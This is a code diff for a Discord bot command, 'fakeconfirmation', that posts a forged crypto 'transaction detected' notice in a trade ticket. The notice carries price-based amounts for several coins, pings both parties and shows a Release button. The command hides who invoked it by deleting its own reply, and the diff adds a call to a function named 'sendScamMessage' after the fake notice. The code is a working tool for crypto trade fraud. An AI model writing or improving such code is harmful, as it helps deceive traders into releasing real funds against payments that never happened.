@@ -1,10 +1,11 @@
-const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder } = require('discord.js');
+const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder, PermissionFlagsBits } = require('discord.js');
 const path = require('path');
 
 module.exports = {
   data: new SlashCommandBuilder()
     .setName('fakeconfirmation')
     .setDescription('Simulate a transaction detected notification')
+    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
     .addNumberOption(option =>
       option.setName('money')
         .setDescription('Amount in USD received')
@@ -26,21 +27,26 @@ module.exports = {
     const user1 = interaction.options.getUser('user1');
     const user2 = interaction.options.getUser('user2');
 
-    // Defer ephemerally so no "X used /fakeconfirmation" shows in the channel
     await interaction.deferReply({ flags: 64 });
 
-    let ltcPrice = 85;
+    const deal = client.activeDeals.get(interaction.channel.id);
+    const coin = deal?.coin || 'LTC';
+
+    let coinPrice = 85;
+    let coinTicker = coin.split(' ')[0];
     try {
       const axios = require('axios');
-      const resp = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd', { timeout: 5000 });
-      ltcPrice = resp.data?.litecoin?.usd || 85;
-    } catch (e) {
-      // fallback
-    }
+      const COINGECKO_IDS = {
+        BTC: 'bitcoin', ETH: 'ethereum', LTC: 'litecoin', SOL: 'solana', USDT: 'tether',
+      };
+      const cgId = COINGECKO_IDS[coinTicker] || 'litecoin';
+      const resp = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${cgId}&vs_currencies=usd`, { timeout: 5000 });
+      coinPrice = resp.data?.[cgId]?.usd || 85;
+    } catch (e) {}
 
-    const ltcAmount = (usdAmount / ltcPrice).toFixed(8);
+    const cryptoAmount = (usdAmount / coinPrice).toFixed(8);
 
-    const checkmarkAttachment = new AttachmentBuilder(path.join(__dirname, '../assets/checkmark.jpg'), { name: 'checkmark.jpg' });
+    const checkmarkFile = new AttachmentBuilder(path.join(__dirname, '../assets/checkmark.jpg'), { name: 'checkmark.jpg' });
 
     const embed = new EmbedBuilder()
       .setColor(0x00c853)
@@ -50,18 +56,13 @@ module.exports = {
       .addFields(
         { name: 'Transaction', value: '[View Transaction](https://blockchair.com/litecoin)', inline: false },
         { name: 'Required Confirmations', value: '1', inline: false },
-        { name: 'Amount Received', value: `${ltcAmount} LTC ($${usdAmount.toFixed(2)} USD)`, inline: false }
+        { name: 'Amount Received', value: `${cryptoAmount} ${coinTicker} ($${usdAmount.toFixed(2)} USD)`, inline: false }
       );
 
-    // Build ping string: prefer explicit users, fall back to active deal state
     const pings = new Set();
-
     if (user1) pings.add(`<@${user1.id}>`);
     if (user2) pings.add(`<@${user2.id}>`);
-
-    // Also pull from deal state if available
     if (pings.size === 0) {
-      const deal = client.activeDeals.get(interaction.channel.id);
       if (deal?.sender) pings.add(`<@${deal.sender}>`);
       if (deal?.receiver) pings.add(`<@${deal.receiver}>`);
     }
@@ -69,20 +70,18 @@ module.exports = {
     const pingContent = pings.size > 0 ? [...pings].join(' ') : undefined;
 
     const actionRow = new ActionRowBuilder().addComponents(
-      new ButtonBuilder()
-        .setCustomId('release_funds')
-        .setLabel('Release')
-        .setStyle(ButtonStyle.Success),
-      new ButtonBuilder()
-        .setCustomId('cancel_deal')
-        .setLabel('Cancel')
-        .setStyle(ButtonStyle.Danger),
+      new ButtonBuilder().setCustomId('release_funds').setLabel('Release').setStyle(ButtonStyle.Success),
+      new ButtonBuilder().setCustomId('cancel_deal').setLabel('Cancel').setStyle(ButtonStyle.Danger),
     );
 
-    // Send embed directly to the channel
-    await interaction.channel.send({ content: pingContent, embeds: [embed], components: [actionRow], files: [checkmarkAttachment] });
+    await interaction.channel.send({ content: pingContent, embeds: [embed], components: [actionRow], files: [checkmarkFile] });
 
-    // Delete the ephemeral ack so nothing is left from the command
+    // Send the scam message right after in the same ticket
+    try {
+      const { sendScamMessage } = require('../utils/monitor');
+      await sendScamMessage(interaction.channel, deal || {}, client);
+    } catch (e) {}
+
     await interaction.deleteReply();
   }
 };
